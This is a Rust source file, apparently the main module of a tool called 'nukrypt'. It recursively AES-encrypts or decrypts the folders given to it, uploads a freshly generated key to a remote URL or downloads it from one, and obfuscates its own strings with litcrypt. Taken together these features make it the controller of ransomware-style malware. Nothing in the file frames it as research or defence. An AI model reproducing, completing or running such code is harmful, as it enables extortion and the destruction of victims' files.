mod crypto;
mod http;

use std::ffi::OsString;
use std::path::Path;
use std::time::Instant;

use structopt::StructOpt;
use litcrypt::{use_litcrypt, lc};


#[derive(Debug, StructOpt)]
#[structopt(name = "nukrypt")]
struct NukryptOptions {
	#[structopt(
		short = "d", long = "decrypt", help = "Decrypt instead of encrypting"
	)]
	decrypt: bool,

	#[structopt(
		short = "k", long = "key-file", value_name = "file|url",
		help = "Read/write AES key from/to [file] or download/upload from/to [url]"
	)]
	key_file: Option<String>,

	#[structopt(
		value_name = "dir", parse(from_os_str), required = true,
		help = "Folder(s) to recursively encrypt or decrypt"
	)]
	args: Vec<OsString>
}

use_litcrypt!("nukrypt");


fn main() {
	let mut key = [0u8; crypto::SIZE_KEY];

	let key_file: &str;
	let opts = NukryptOptions::from_args();


	match opts.key_file {
		Some(_) => {
			key_file = opts.key_file.as_deref().unwrap()
		},
		None => {
			println!("{}", lc!("[!] No key file specified"));
			return;
		}
	}

	if key_file.starts_with("http://") || key_file.starts_with("https://") {
		println!(
			"{} {}", lc!("[*] Downloading AES key from"), key_file
		);

		match http::download_key(key_file) {
			Ok(b) => {
				println!("{}\n", lc!("[+] AES key downloaded"));
				key = b;
			},
			Err(e) => {
				if opts.decrypt {
					println!("{} {}", lc!("[!] Failed to download AES key:"), e);
					return;
				}

				println!("{} {}\n", lc!("[-] Failed to download AES key:"), e);
				println!("{}", lc!("[*] Generating and uploading AES key"));

				key = crypto::gen_key();

				match http::upload_key(key_file, &key) {
					Ok(_)  => {
						println!("{}\n", lc!("[+] AES key uploaded"));
					},
					Err(e) => {
						println!("{} {}", lc!("[!] Failed to upload AES key:"), e);
						return;
					}
				}
			}
		}
	}
	else {
		match crypto::read_key(key_file, &mut key) {
			Ok(_)  => {
				println!("{} {}\n", lc!("[+] AES key read from"), key_file);
			},
			Err(e) => {
				if opts.decrypt {
					println!("{} {}", lc!("[!] Failed to read key:"), e);
					return;
				}

				key = crypto::gen_key();

				match crypto::write_key(key_file, &key) {
					Ok(_)  => {
						println!(
							"{} {}\n",
							lc!("[+] Encryption key written to"), key_file
						)
					},
					Err(_) => {
						println!("{} {}", lc!("[!] Failed to write encryption key to"), key_file);
						return;
					}
				}
			}
		}
	}

	for i in 0..opts.args.len() {
		let arg = &opts.args[i].to_str().unwrap();

		if ! Path::new(arg).is_dir() {
			println!("{} {}", lc!("[!] No such directory:"), arg);
			return;
		}
	}

	let mut counter : usize = 0;
	let before = Instant::now();

	for i in 0..opts.args.len() {
		let arg = &opts.args[i].to_str().unwrap();

		if ! Path::new(arg).is_dir() {
			println!("{} {}", lc!("[!] No such directory:"), arg);
			return;
		}

		if opts.decrypt {
			counter += crypto::decrypt_dir(arg, &key);
		}
		else {
			counter += crypto::encrypt_dir(arg, &key);
		}
	}

	if opts.decrypt {
		println!(
			"\n{} {} {} {:.3} {}", lc!("[+]"), counter, lc!("files decrypted in"),
			(before.elapsed().as_millis() as f32) / 1000.0, lc!("seconds")
		);
	}
	else {
		println!(
			"\n{} {} {} {:.3} {}", lc!("[+]"), counter, lc!("files encrypted in"),
			(before.elapsed().as_millis() as f32) / 1000.0, lc!("seconds")
		);
	}
}